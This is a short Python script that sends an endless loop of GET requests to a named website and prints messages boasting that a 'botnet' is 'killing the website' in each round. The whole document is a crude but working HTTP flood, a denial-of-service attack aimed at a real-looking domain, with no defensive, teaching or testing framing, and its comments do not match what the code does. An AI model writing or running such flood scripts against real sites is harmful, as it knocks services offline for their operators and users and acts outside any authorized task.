import requests

count = 0
while True:
    url = 'http://botnet.medal-media.com'
    response = requests.get(url)  # To execute get request
    count = count + 1
    print("Hazeley Botnet Kiling The Website in Round " + str(count))  # To print formatted JSON response
